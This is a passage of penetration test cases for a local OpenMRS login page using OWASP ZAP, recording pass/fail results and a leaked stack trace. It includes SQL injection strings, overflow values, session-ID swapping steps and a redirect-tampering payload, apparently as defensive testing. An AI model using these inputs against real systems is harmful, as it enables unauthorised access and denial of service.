7. In zap window, if you see "POST:login.htm(password, redirectURL,sessionLocation,username)" on the left panel (the "Sites" panel) then you got it, if not, please repeat step 3 to 5
8. Select "POST:login.htm(password, redirectURL,sessionLocation,username)" from the left panel and select the "Request" tab on the right panel. The right panel will turn into 2 smaller panels. At the bottom one, you will see "username=admin&password=BBBBB&sessionLocation=2&redirectUrl="
9. Highlight the "BBBBB" part from the string you got in previous step, right click on it and choose "Fuzz". A Fuzzer window will be opened.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/openFuzzMenu.png)

10. In the fuzzer window, click "Payloads..." button. A child window will be opened

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzzerWindow.png)

11. In the child "Payloads" window, click "Add". An "Add payload" window will be opened
12. In "Add payload window, in the "Type" box, choose "File Fuzzers". Expand the "jbrofuzz" section. Check the box of "SQL Injection" and click "Add". The child window will be closed.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sqlInjection.png)

13. In Payloads window, click "OK" and you will be returned to the "Fuzzer" window. In this window, click "Start Fuzzer" button and you will be returned to the main Zap window with the "Fuzzer" tab selected
14. Observe the results in the "Fuzzer" tab, especially the "Code" and "Size Resp. Body". Check the HTTP response by selecting a fuzz entry, and select the "Response" tab in the uper right panel.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sqlInjectionResults.png)

### * Expected results
+ OpenMRS should redirect invalid logins back to the login page.
+ System has to be able to fail securely.

### * Post-condition
OpenMRS should still be operating normally

### * Actual results
+ 169 fuzz were done on the "password" variable
+ 167 of the entries have 302 code and zero size of Response html body. Confirmed by inspection of html header, noticing that system redirects invalid login to previous page - the login page.
+ 002 of the fuzz entries were able to force system to leak some debugging informations which can be used for further attacks (to be discussed further in the Notes section)
+ We decided that the test is a "FAILED". Even though no exploit directly linked to Injection was successful, the fuzzer was able to leak some important debugging data. 

### * NOTES:

FUZZ STRING USED TO CAUSE THE LEAK
> username=admin&password='; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --&sessionLocation=2&redirectUrl=

or

> username=admin&password='; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --&sessionLocation=2&redirectUrl=

LEAKED SYSTEM INFO

Originally harvested by OWASP fuzzer in HttpResponse and may not be able to reproduce using the regular browser/view source method.
```
<h1>UI Framework Error</h1>

<h2>Root Error</h2>
<pre>com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException: Duplicate entry '1-lockoutTimestamp' for key 'PRIMARY'
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
	at com.mysql.jdbc.Util.handleNewInstance(Util.java:411)
	at com.mysql.jdbc.Util.getInstance(Util.java:386)
	at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:1041)
	at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4237)
	at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4169)
	at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2617)
	at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2778)
	at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2825)
	at com.mysql.jdbc.PreparedStatement.executeInternal(PreparedStatement.java:2156)
	at com.mysql.jdbc.PreparedStatement.executeUpdate(PreparedStatement.java:2441)
	at com.mysql.jdbc.PreparedStatement.executeBatchSerially(PreparedStatement.java:2007)
	at com.mysql.jdbc.PreparedStatement.executeBatch(PreparedStatement.java:1467)
	at com.mchange.v2.c3p0.impl.NewProxyPreparedStatement.executeBatch(NewProxyPreparedStatement.java:1135)
	at org.hibernate.engine.jdbc.batch.internal.BatchingBatch.performExecution(BatchingBatch.java:127)
	at org.hibernate.engine.jdbc.batch.internal.BatchingBatch.doExecuteBatch(BatchingBatch.java:114)
	at org.hibernate.engine.jdbc.batch.internal.AbstractBatchImpl.execute(AbstractBatchImpl.java:163)
	at org.hibernate.engine.jdbc.internal.JdbcCoordinatorImpl.executeBatch(JdbcCoordinatorImpl.java:226)
	at org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:484)
	at org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:351)
	at org.hibernate.event.internal.AbstractFlushingEventListener.performExecutions(AbstractFlushingEventListener.java:350)
	at org.hibernate.event.internal.DefaultFlushEventListener.onFlush(DefaultFlushEventListener.java:56)
	at org.hibernate.internal.SessionImpl.flush(SessionImpl.java:1258)
	at org.hibernate.internal.SessionImpl.managedFlush(SessionImpl.java:425)
	at org.hibernate.engine.transaction.internal.jdbc.JdbcTransaction.beforeTransactionCommit(JdbcTransaction.java:101)
	at org.hibernate.engine.transaction.spi.AbstractTransactionImpl.commit(AbstractTransactionImpl.java:177)
	at org.springframework.orm.hibernate4.HibernateTransactionManager.doCommit(HibernateTransactionManager.java:584)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:757)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:726)
	at org.springframework.transaction.interceptor.TransactionAspectSupport.completeTransactionAfterThrowing(TransactionAspectSupport.java:553)
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:285)
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)
	at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:207)
	at com.sun.proxy.$Proxy290.authenticate(Unknown Source)
	at org.openmrs.api.context.UserContext.authenticate(UserContext.java:100)
	at org.openmrs.api.context.Context.authenticate(Context.java:297)
	at org.openmrs.module.referenceapplication.page.controller.LoginPageController.post(LoginPageController.java:217)
	at sun.reflect.GeneratedMethodAccessor542.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at org.openmrs.ui.framework.UiFrameworkUtil.invokeMethodWithArguments(UiFrameworkUtil.java:112)
	at org.openmrs.ui.framework.UiFrameworkUtil.executeControllerMethod(UiFrameworkUtil.java:71)
	at org.openmrs.ui.framework.page.PageFactory.handleRequestWithController(PageFactory.java:219)
	at org.openmrs.ui.framework.page.PageFactory.processThisFragment(PageFactory.java:160)
	at org.openmrs.ui.framework.page.PageFactory.process(PageFactory.java:116)
	at org.openmrs.ui.framework.page.PageFactory.handle(PageFactory.java:86)
	at org.openmrs.module.uiframework.PageController.handlePath(PageController.java:116)
	at org.openmrs.module.uiframework.PageController.handleUrlWithDotPage(PageController.java:83)
	at sun.reflect.GeneratedMethodAccessor540.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:177)
	at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:446)
	at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:434)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:943)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966)
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:868)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:647)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:749)
	at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:487)
	at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:412)
	at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:339)
	at org.springframework.web.servlet.view.InternalResourceView.renderMergedOutputModel(InternalResourceView.java:168)
	at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:303)
	at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1228)
	at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1011)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:955)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966)
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:868)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:647)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.module.web.filter.ForcePasswordChangeFilter.doFilter(ForcePasswordChangeFilter.java:60)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.GZIPFilter.doFilterInternal(GZIPFilter.java:64)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.module.web.filter.ModuleFilterChain.doFilter(ModuleFilterChain.java:72)
	at org.openmrs.module.owa.filter.OwaFilter.doFilter(OwaFilter.java:64)
	at org.openmrs.module.web.filter.ModuleFilterChain.doFilter(ModuleFilterChain.java:70)
	at org.openmrs.module.web.filter.ModuleFilter.doFilter(ModuleFilter.java:54)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.OpenmrsFilter.doFilterInternal(OpenmrsFilter.java:108)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.orm.hibernate4.support.OpenSessionInViewFilter.doFilterInternal(OpenSessionInViewFilter.java:150)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.StartupFilter.doFilter(StartupFilter.java:105)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.StartupFilter.doFilter(StartupFilter.java:105)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.StartupFilter.doFilter(StartupFilter.java:105)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:502)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:409)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1044)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:607)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:315)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
</pre>

```
# Fuzz -4- LOGIN PAGE BUFFER OVER FLOW
### Priority : HIGH
### Test status : PASSED
`DESIGNER : TAM N NGUYEN` <br/>
`EXECUTED BY : TAM N NGUYEN` <br/>
`UPDATED ON : 20OCT17` <br/>
`EXECUTED ON : 20OCT17` <br/>

### * Description
#### Name of module : OpenMRS login
+ Page location : http://localhost:8081/openmrs-standalone/login.htm
+ Fuzz string : username=admin&password=[fuzz data]&sessionLocation=2&redirectUrl=
+ Fuzz data : jbrofuzz pre-installed rules in OWASP scanner
Fuzzer will deploy 17 buffer overflow attack strings on the variable "password" in form of POST requests. Server HttpResponses will be analyzed and be decided if the attacks were successful or not.


### * Precondition
1. A local computer with administrator privilege
2. Java JRE installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unziped
4. OWASP ZAP Version 2.6.0 downloaded and installed

### * Dependencies
1. OpenMRS with demo database was loaded and runs normally
2. OWASP ZAP runs normally

### * Test Data
jbrofuzz rules came standard with OWASP Zap

### * Test steps
1. Open up OpenMRS V. 2.6.0 Standalone. Make sure Tomcat Port is 8081 and MySQL port is 3316. A web page starting with localhost:8081 will be automatically opened upon successful start.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/portSettings.png)

2. Open OWASP Zap V2.6.0
3. From OWASP Zap, go to Toos > Launch the Zap JxBrowser
4. In the Zap JxBrowser, type "http://localhost:8081/openmrs-standalone/login.htm" (without the double quotes) into the address bar and hit Enter
5. Go to the main Zap window, on the left side bar, in "Sites" tab, under "Sites" sub section, you will now see "http://localhost:8081". Expand that until you see "GET:login.htm". If you don't see it, please go to the JzBrowser and make sure the login page is loaded. If the page is not loaded, you need to double check the OpenMRS to make sure it runs properly

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sitesLoaded.png)

6. Go back to the Zap JxBrowser and type a bogus pair of username/password (we use "admin" for username and "BBBBB" for password), select "Pharmacy" section and click login. When the page got reloaded with "Invalid username/password. Please try again", close JxBrowser window and get back to main Zap window

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/adminLoginScreen.png)

7. In zap window, if you see "POST:login.htm(password, redirectURL,sessionLocation,username)" on the left panel (the "Sites" panel) then you got it, if not, please repeat step 3 to 5
8. Select "POST:login.htm(password, redirectURL,sessionLocation,username)" from the left panel and select the "Request" tab on the right panel. The right panel will turn into 2 smaller panels. At the bottom one, you will see "username=admin&password=BBBBB&sessionLocation=2&redirectUrl="
9. Highlight the "BBBBB" part from the string you got in previous step, right click on it and choose "Fuzz". A Fuzzer window will be opened.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/openFuzzMenu.png)

10. In the fuzzer window, click "Payloads..." button. A child window will be opened

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzzerWindow.png)

11. In the child "Payloads" window, click "Add". An "Add payload" window will be opened
12. In "Add payload window, in the "Type" box, choose "File Fuzzers". Expand the "jbrofuzz" section. Check the box of "Buffer Overflow" and click "Add". The child window will be closed.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzzBOF.png)

13. In Payloads window, click "OK" and you will be returned to the "Fuzzer" window. In this window, click "Start Fuzzer" button and you will be returned to the main Zap window with the "Fuzzer" tab selected
14. Observe the results in the "Fuzzer" tab, especially the "Code" and "Size Resp. Body". Check the HTTP response by selecting a fuzz entry, and select the "Response" tab in the uper right panel.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/BOFresults.png)

### * Expected results
+ OpenMRS should redirect invalid logins back to the login page.
+ System has to be able to fail securely.

### * Post-condition
OpenMRS should still be operating normally

### * Actual results
+ 17 fuzz were done on the "password" variable
+ All of the entries have 302 code and zero size of Response html body. Confirmed by inspection of html header, noticing that system redirects invalid login to previous page - the login page. 

### * NOTES:
In the future, we would create more fuzz cases with higher amount of characters # Client Bypass -1- LOGIN PAGE INTEGER BUFFER OVER FLOW
### Priority : HIGH
### Test status : FAILED
`DESIGNER : TAM N NGUYEN` <br/>
`EXECUTED BY : TAM N NGUYEN` <br/>
`UPDATED ON : 20OCT17` <br/>
`EXECUTED ON : 20OCT17` <br/>

### * Description
#### Name of module : OpenMRS login
+ Page location : http://localhost:8081/openmrs-standalone/login.htm
+ Attack type : Buffer overflow
+ Attack value : 99999999999999999999
In this test, we will interup browser requests and try to overflow the value of working "location".


### * Precondition
1. A local computer with administrator privilege
2. Java JRE installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unziped
4. OWASP ZAP Version 2.6.0 downloaded and installed

### * Dependencies
1. OpenMRS with demo database was loaded and runs normally
2. OWASP ZAP runs normally
3. OWASP Local Proxy was properly configured
4. Browser proxy setting was properly configured to be pointed to OWASP proxy

### * Test steps
1. Open up OpenMRS V. 2.6.0 Standalone. Make sure Tomcat Port is 8081 and MySQL port is 3316. A web page starting with localhost:8081 will be automatically opened upon successful start.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/portSettings.png)

2. Open Google Chrome. In the browser, type "http://localhost:8081/openmrs-standalone/login.htm" (without the double quotes) into the address bar and hit Enter
3. Go to the main Zap window, on the left side bar, in "Sites" tab, under "Sites" sub section, you will now see "http://localhost:8081". Expand that until you see "GET:login.htm". If you don't see it, please go to the Chrome browser and make sure the login page is loaded. If the page is not loaded, you need to double check the OpenMRS to make sure it runs properly. If the page is loaded, you need to make sure proxy settings on both OpenMRS and Google Chrome were configured properly.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sitesLoaded.png)

4. Go back to the Chrome and login with a pair of username/password (we use "admin" for username and "Admin123" for password), select "Pharmacy" section and click login. After successful login, you log out.
5. Repeat step 2 to 4 but with this URL "http://localhost:8081/openmrs-standalone/referenceapplication/login.page"

6. In zap window, if you see two important page staring with "POST:login.htm" and "POST:login.page" on the left panel (the "Sites" panel).

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sites.png)

7. Select "POST:login.htm(password, redirectURL,sessionLocation,username)" from the left panel and select the "Break..." and then click "Save" and do the same for the page starts with "POST:login.page" under "referenceapplication" folder. 
8. The "Break Points" tab in the bottom pane should look like this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/breakpoints-login.png)

9. We now get back to our browser. Go to "Settings" > "Clear browsing data". Choose "Clear the following items from the beginning of time", check all the boxes and click "Clear browsing data"
10. Close "Settings" tab, and refresh the OpenMRS login page. Type in username: admin, and password: Admin123, choose "Pharmacy" location and click "Login"
10. You will not be able to login right away and OWASP Zap proxy may issue you an alert saying it is interupting the request. In such case, you can acknowledge the alert. Your screen should look similar to this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/interup1.png)

11. Notice that by the end of the header, we have a value set of "referenceapplication.lastSessionLocation=2" and in the POST request, we have "sessionLocation=2". Replace the number 2 with "99999999999999999999" (twenty 9s) and then click the "play" symbol right above the "request" tab

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/changeVal99.png)

12. Click the "play" button several more times until the browser finishes loading the login page.


### * Expected results
+ OpenMRS should fail securely either by assigning user to a default location or gave a prompt that the location needs to be reselected.
+ Error should not reveal too much information about the system

### * Post-condition
OpenMRS should still be operating normally

### * Actual results

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/BOFerror.png)

### * NOTES:
A very detailed stack trace was given which is a violation of "Fail securely" principle. Defaulting user to a default location should be a good way to mitigate this bug.# Client Bypass -2- LOGIN PAGE SESSION HIJACK
### Priority : HIGH
### Test status : PASSED
`DESIGNER : TAM N NGUYEN` <br/>
`EXECUTED BY : TAM N NGUYEN` <br/>
`UPDATED ON : 20OCT17` <br/>
`EXECUTED ON : 20OCT17` <br/>

### * Description
#### Name of module : OpenMRS login
+ Page location : http://localhost:8081/openmrs-standalone/login.htm
+ Attack type : Session hijacking
+ Attack value : the JSESSIONID value of a user's session
This attack will try to swith the sessions between a clerk with limitted privilege and an administrator. Action is simple and based on modification of http header value.

### * Precondition
1. A local computer with administrator privilege
2. Java JRE installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unziped
4. OWASP ZAP Version 2.6.0 downloaded and installed

### * Dependencies
1. OpenMRS with demo database was loaded and runs normally
2. OWASP ZAP runs normally
3. OWASP Local Proxy was properly configured
4. Browser proxy setting was properly configured to be pointed to OWASP proxy

### * Test steps
1. Open up OpenMRS V. 2.6.0 Standalone. Make sure Tomcat Port is 8081 and MySQL port is 3316. A web page starting with localhost:8081 will be automatically opened upon successful start.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/portSettings.png)

2. Open Google Chrome. In the browser, type "http://localhost:8081/openmrs-standalone/login.htm" (without the double quotes) into the address bar and hit Enter
3. Go to the main Zap window, on the left side bar, in "Sites" tab, under "Sites" sub section, you will now see "http://localhost:8081". Expand that until you see "GET:login.htm". If you don't see it, please go to the Chrome browser and make sure the login page is loaded. If the page is not loaded, you need to double check the OpenMRS to make sure it runs properly. If the page is loaded, you need to make sure proxy settings on both OpenMRS and Google Chrome were configured properly.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sitesLoaded.png)

4. Go back to the Chrome and login with a pair of username/password (we use "admin" for username and "Admin123" for password), select "Pharmacy" section and click login. After successful login, you log out.
5. Repeat step 2 to 4 but with this URL "http://localhost:8081/openmrs-standalone/referenceapplication/login.page"

6. In zap window, if you see two important page staring with "POST:login.htm" and "POST:login.page" on the left panel (the "Sites" panel).

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sites.png)

7. Select "POST:login.htm(password, redirectURL,sessionLocation,username)" from the left panel and select the "Break..." and then click "Save" and do the same for the page starts with "POST:login.page" under "referenceapplication" folder. 
8. The "Break Points" tab in the bottom pane should look like this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/breakpoints-login.png)

9. We now get back to our browser. Go to "Settings" > "Clear browsing data". Choose "Clear the following items from the beginning of time", check all the boxes and click "Clear browsing data"
10. Close "Settings" tab, and refresh the OpenMRS login page. Type in username: admin, and password: Admin123, choose "Pharmacy" location and click "Login"
10. You will not be able to login right away and OWASP Zap proxy may issue you an alert saying it is interupting the request. In such case, you can acknowledge the alert. Your screen should look similar to this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/interup1.png)

11. Notice that by the end of the header, we have a value set of 
> Cookie: JSESSIONID=D1392D7F2D37E5208D57E0F677CBC686; referenceapplication.lastSessionLocation=2
Copy the value of JSESSIONID. Your value may be different and for our test at this time, that value is D1392D7F2D37E5208D57E0F677CBC686
12. Click the "play" button several more times until the browser finishes loading and you should be able to logged into the dashboard.
13. Keep the current browser window and open another Google Chrome browser window in ICOGNITO mode and go to the login page. You may have to click the play button several times for the page to load. Once the page is load, login with the clerk credential (Username: clerk, password: Clerk123) and location is "Registration Desk"
14. Notice that after you click "Login", you will be brought to OWASP Zap proxy and see something like this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/interup2.png)

15. Replace the current value of JSESSIONID (highlighted in the screenshot) with the value of the other JSESSIONID which is in our case, the value in step 11. Click the play button after you're done.
16. Click play two more times and you will see another header with the variable JSESSIONID again.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/interup3.png)

Replace it again with the value you recorded in step 11 and then click play button.
17. The server will refuse and force the original sessionID value of clerk. If we keep changing the clerk's sessionID to the admin's sessionID, we will run into step 16 and loop in it again and again. If we accept the server's value of sessionID, after clicking the play button, we will return back to the login page with no account logged in. Note that this is within the Icognito browser. Admin is still logged in in the regular browser
18. Close the incognito browser. Log out of admin account in the regular browser (once again, you may to click the play button several times to log out)

### * Expected results
+ OpenMRS should fail securely either by issuing an error message or redirecting user to login page
+ Error should not reveal too much information about the system

### * Post-condition
OpenMRS should still be operating normally

### * Actual results
System silently redirect user to login page without any error or announcement.

### * NOTES:
n/a# Client Bypass -3- LOGIN PAGE REDIRECT
### Priority : HIGH
### Test status : FAILED
`DESIGNER : TAM N NGUYEN` <br/>
`EXECUTED BY : TAM N NGUYEN` <br/>
`UPDATED ON : 20OCT17` <br/>
`EXECUTED ON : 20OCT17` <br/>

### * Description
#### Name of module : OpenMRS login
+ Page location : http://localhost:8081/openmrs-standalone/login.htm
+ Attack type : unauthorized redirect after login
+ Attack value : %2Fopenmrs-standalone%2Fappui%2Fheader%2Flogout.action%3FsuccessUrl%3Dopenmrs-standalone
In this test, we will redirect logged in user to a logout page, aiming for an illusion that user's credential was not correct. The exploit is simple yet can cause a massive confusion as well as effective denial of service


### * Precondition
1. A local computer with administrator privilege
2. Java JRE installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unziped
4. OWASP ZAP Version 2.6.0 downloaded and installed

### * Dependencies
1. OpenMRS with demo database was loaded and runs normally
2. OWASP ZAP runs normally
3. OWASP Local Proxy was properly configured
4. Browser proxy setting was properly configured to be pointed to OWASP proxy

### * Test steps
1. Open up OpenMRS V. 2.6.0 Standalone. Make sure Tomcat Port is 8081 and MySQL port is 3316. A web page starting with localhost:8081 will be automatically opened upon successful start.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/portSettings.png)

2. Open Google Chrome. In the browser, type "http://localhost:8081/openmrs-standalone/login.htm" (without the double quotes) into the address bar and hit Enter
3. Go to the main Zap window, on the left side bar, in "Sites" tab, under "Sites" sub section, you will now see "http://localhost:8081". Expand that until you see "GET:login.htm". If you don't see it, please go to the Chrome browser and make sure the login page is loaded. If the page is not loaded, you need to double check the OpenMRS to make sure it runs properly. If the page is loaded, you need to make sure proxy settings on both OpenMRS and Google Chrome were configured properly.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sitesLoaded.png)

4. Go back to the Chrome and login with a pair of username/password (we use "admin" for username and "Admin123" for password), select "Pharmacy" section and click login. After successful login, you log out.
5. Repeat step 2 to 4 but with this URL "http://localhost:8081/openmrs-standalone/referenceapplication/login.page"

6. In zap window, if you see two important page staring with "POST:login.htm" and "POST:login.page" on the left panel (the "Sites" panel).

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sites.png)

7. Select "POST:login.htm(password, redirectURL,sessionLocation,username)" from the left panel and select the "Break..." and then click "Save" and do the same for the page starts with "POST:login.page" under "referenceapplication" folder. 
8. The "Break Points" tab in the bottom pane should look like this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/breakpoints-login.png)

9. We now get back to our browser. Go to "Settings" > "Clear browsing data". Choose "Clear the following items from the beginning of time", check all the boxes and click "Clear browsing data"
10. Close "Settings" tab, and refresh the OpenMRS login page. Type in username: admin, and password: Admin123, choose "Pharmacy" location and click "Login"
10. You will not be able to login right away and OWASP Zap proxy may issue you an alert saying it is interupting the request. In such case, you can acknowledge the alert. Your screen should look similar to this

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/interup4.png)

11. Notice that in the request body, there is a variable "redirectUrl" (the highlighted section). We will replace the value of that variable with "%2Fopenmrs-standalone%2Fappui%2Fheader%2Flogout.action%3FsuccessUrl%3Dopenmrs-standalone" (no double quotes) and then click the "play" symbol right above the "request" tab

12. Click the "play" button several more times until the browser finishes loading and we will find that we are at the login page (as if our login credential used was not correct)


### * Expected results
